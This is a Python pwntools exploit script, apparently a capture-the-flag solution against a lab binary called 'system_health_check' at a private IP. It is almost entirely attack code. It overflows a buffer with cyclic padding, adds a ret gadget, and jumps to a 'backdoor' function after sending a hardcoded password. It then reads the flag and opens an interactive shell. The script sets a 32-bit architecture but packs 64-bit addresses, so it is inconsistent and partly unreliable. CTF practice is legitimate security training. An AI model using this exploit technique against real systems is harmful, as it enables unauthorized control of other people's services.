#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 192.168.88.33 --port 1024
from pwn import *

os.environ['XDG_CACHE_HOME'] = '/tmp' # some docker glitch fix

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = context.binary = ELF('system_health_check')
context.terminal = ['tmux','splitw','-h']

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '192.168.88.33'
port = int(args.PORT or 1024)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

padding = b"A"*cyclic_find("acla")
payload = padding


io = start()

# MOVAPS issue
rop = ROP(exe)
ret_gadget = rop.ret
print(ret_gadget.address)
payload += p64(ret_gadget.address) 

payload += p64(exe.symbols["backdoor"])


io.clean()
# payload = cyclic(0xff+0xf) # find padding
io.sendline(b"sUp3r_S3cr3T_P4s5w0rD\x00"+payload)
io.recv(timeout = 2)
io.sendline("cat flag\n")
io.interactive()


